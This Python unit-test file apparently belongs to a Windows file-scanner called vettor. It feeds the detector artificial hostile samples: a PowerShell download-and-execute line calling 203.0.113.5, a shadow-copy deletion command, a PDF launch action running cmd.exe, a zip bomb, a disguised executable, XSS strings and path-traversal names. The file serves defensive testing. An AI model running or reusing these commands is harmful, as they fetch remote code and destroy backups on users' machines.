"""Автоматические тесты проверки файлов и распаковки.

Запуск из папки проекта:  .venv\\Scripts\\python -m unittest discover -s tests -v
Настоящих вирусов тесты не используют: «вредные» признаки собираются искусственно,
а тестовая строка EICAR проверяется только в памяти (на диске её сразу удалил бы Defender)."""
import os
import shutil
import sys
import tempfile
import unittest
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from vettor import extract  # noqa: E402
from vettor.analysis import report as reports  # noqa: E402
from vettor.analysis import static, worker  # noqa: E402
from vettor.analysis.indicators import Indicator, decide  # noqa: E402

NOTEPAD = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "notepad.exe")
EICAR = ("X5O!P%@AP[4" + chr(92) + "PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()


def analyze(path):
    return static.analyze(path, defender=False)


def ids(report):
    return {i["id"] for i in report["indicators"]}


class Base(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="vettor_test_")

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def write(self, name, data):
        p = os.path.join(self.dir, name)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb" if isinstance(data, bytes) else "w", **({} if isinstance(data, bytes) else {"encoding": "utf-8"})) as f:
            f.write(data)
        return p


class TestYara(unittest.TestCase):
    def rules(self):
        import yara
        return yara.compile(filepath=os.path.join(ROOT, "vettor", "analysis", "rules.yar"))

    def test_eicar_in_memory(self):
        self.assertIn("EICAR_Test_File", [m.rule for m in self.rules().match(data=EICAR)])

    def test_clean_data(self):
        self.assertEqual([], self.rules().match(data=b"just a normal text file " * 100))

    def test_ransom_note(self):
        self.assertIn("Ransom_Note_Text", [m.rule for m in self.rules().match(
            data=b"Your files have been encrypted! Send bitcoin to unlock.")])


class TestVerdict(unittest.TestCase):
    def make(self, *inds, checks=None, error=None):
        r = {"indicators": [i.to_dict() for i in inds],
             "checks": checks or {k: "выполнено" for k in static.STAGES[:8]}}
        if error:
            r["error"] = error
        return decide(r)

    def test_single_ambiguous_is_not_malicious(self):
        v = self.make(Indicator("sig_none", "low", "Нет подписи"), Indicator("pe_packer", "low", "UPX"))
        self.assertEqual("low", v["code"])

    def test_critical_is_malicious(self):
        self.assertEqual("malicious", self.make(Indicator("defender", "critical", "Defender"))["code"])

    def test_two_high_is_high_risk(self):
        v = self.make(Indicator("a", "high", "A"), Indicator("b", "high", "B"))
        self.assertEqual("high", v["code"])

    def test_one_high_needs_review(self):
        self.assertEqual("review", self.make(Indicator("a", "high", "A"))["code"])

    def test_error_is_insufficient(self):
        self.assertEqual("insufficient", self.make(error="прервано")["code"])

    def test_valid_signature_lowers_score(self):
        v = self.make(Indicator("x", "medium", "X"), Indicator("y", "medium", "Y"),
                      Indicator("sig_valid", "info", "Подписан", weight=-3))
        self.assertEqual("low", v["code"])


class TestStatic(Base):
    @unittest.skipUnless(os.path.exists(NOTEPAD), "нет notepad.exe")
    def test_signed_system_program_is_low_risk(self):
        r = analyze(NOTEPAD)
        self.assertEqual("pe", r["file"]["type"])
        self.assertEqual("Valid", r["signature"]["status"])
        self.assertEqual("low", r["verdict"]["code"])

    @unittest.skipUnless(os.path.exists(NOTEPAD), "нет notepad.exe")
    def test_program_disguised_as_picture(self):
        p = self.write("photo.jpg", open(NOTEPAD, "rb").read())
        self.assertIn("pe_disguised", ids(analyze(p)))

    @unittest.skipUnless(os.path.exists(NOTEPAD), "нет notepad.exe")
    def test_truncated_program(self):
        p = self.write("broken.exe", open(NOTEPAD, "rb").read()[:3000])
        r = analyze(p)
        self.assertEqual("insufficient", r["verdict"]["code"])

    def test_hashes(self):
        p = self.write("a.txt", b"abc")
        r = analyze(p)
        self.assertEqual("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", r["file"]["sha256"])

    def test_suspicious_script(self):
        p = self.write("run.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')\n"
                                  "powershell -w hidden -ExecutionPolicy Bypass\n")
        r = analyze(p)
        self.assertTrue({"cmd_download_exec", "cmd_hidden_run", "cmd_dyn_exec"} <= ids(r))
        self.assertIn(r["verdict"]["code"], ("review", "high"))

    def test_backup_deletion_command(self):
        p = self.write("clean.bat", "vssadmin delete shadows /all /quiet\n")
        self.assertIn("cmd_backup_delete", ids(analyze(p)))

    @unittest.skipUnless(os.path.exists(NOTEPAD), "нет notepad.exe")
    def test_archive_with_disguised_program(self):
        p = os.path.join(self.dir, "film.zip")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("film/movie.mp4.exe", open(NOTEPAD, "rb").read())
            z.writestr("film/info.txt", "смотрите")
        r = analyze(p)
        self.assertIn("arc_dangerous_file", ids(r))
        self.assertEqual("high", r["verdict"]["code"])
        self.assertEqual(1, len([s for s in r["inner"] if "verdict" in s]))

    def test_password_archive(self):
        p = os.path.join(self.dir, "secret.zip")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("a.exe", b"MZ" + b"\0" * 100)
        data = bytearray(open(p, "rb").read())
        # ставим флаг «зашифровано» в локальном и центральном заголовках
        data[6] |= 1
        cd = data.find(b"PK\x01\x02")
        data[cd + 8] |= 1
        open(p, "wb").write(bytes(data))
        self.assertIn("arc_password", ids(analyze(p)))

    def test_zip_bomb_detected_without_unpacking(self):
        p = os.path.join(self.dir, "bomb.zip")
        with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z, z.open("zeros.bin", "w", force_zip64=True) as f:
            chunk = b"\0" * (16 * 1024 * 1024)
            for _ in range(70):  # 1.1 ГБ нулей → около 1 МБ в архиве
                f.write(chunk)
        self.assertIn("arc_bomb", ids(analyze(p)))

    def test_ooxml_macro(self):
        p = os.path.join(self.dir, "invoice.docm")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("[Content_Types].xml", "<Types/>")
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0VBA")
        self.assertIn("doc_macro", ids(analyze(p)))

    def test_pdf_launch_action(self):
        p = self.write("doc.pdf", b"%PDF-1.4\n1 0 obj << /OpenAction << /S /Launch /F (cmd.exe) >> >> endobj\n")
        self.assertIn("pdf_launch", ids(analyze(p)))

    def test_bidi_name(self):
        p = self.write("invoice" + chr(0x202E) + "fdp.exe", b"MZ" + b"\0" * 64)
        self.assertIn("name_bidi", ids(analyze(p)))


class TestWorker(Base):
    def test_isolated_run(self):
        p = self.write("note.txt", "hello")
        stages = []
        r = worker.run(p, os.path.join(self.dir, "work"), lambda s, n, t: stages.append(s))
        self.assertEqual(r["file"]["sha256"], static._hashes(p)["sha256"])
        self.assertEqual(list(range(len(static.STAGES))), sorted(set(stages)))

    def test_failed_report(self):
        r = worker._failed(self.write("x.bin", b"1"), "проверка")
        self.assertEqual("insufficient", r["verdict"]["code"])


class TestReport(Base):
    def test_html_is_escaped(self):
        r = analyze(self.write("a.txt", "hello"))
        r["file"]["name"] = "<script>alert(1)</script>.txt"
        r["indicators"].append({"id": "x", "severity": "high", "title": "<b>x</b>", "evidence": ["<img src=x>"],
                                "category": "", "weight": 8})
        out = os.path.join(self.dir, "r.html")
        reports.export_html(r, out)
        html = open(out, encoding="utf-8").read()
        self.assertNotIn("<script>alert", html)
        self.assertNotIn("<img src=x>", html)
        self.assertIn("&lt;script&gt;", html)


class TestExtractSafety(unittest.TestCase):
    def test_paths(self):
        self.assertIsNone(extract.safe_relpath("../../evil.txt"))
        self.assertEqual(os.path.join("C_", "Windows", "x.txt"), extract.safe_relpath("C:/Windows/x.txt"))
        self.assertEqual("_CON.txt", extract.safe_relpath("CON.txt"))
        self.assertEqual("a.txt_s", extract.safe_relpath("a.txt:s"))
        self.assertEqual(os.path.join("abs", "f"), extract.safe_relpath("/abs/f"))

    def test_find_archives(self):
        sets, _ = extract.find_archives([r"C:\d\g.part1.rar", r"C:\d\g.part2.rar", r"C:\d\x.zip", r"C:\d\y.tar.gz"])
        kinds = sorted((s.kind, len(s.paths)) for s in sets)
        self.assertEqual([("rar", 2), ("tar", 1), ("zip", 1)], kinds)


if __name__ == "__main__":
    unittest.main()
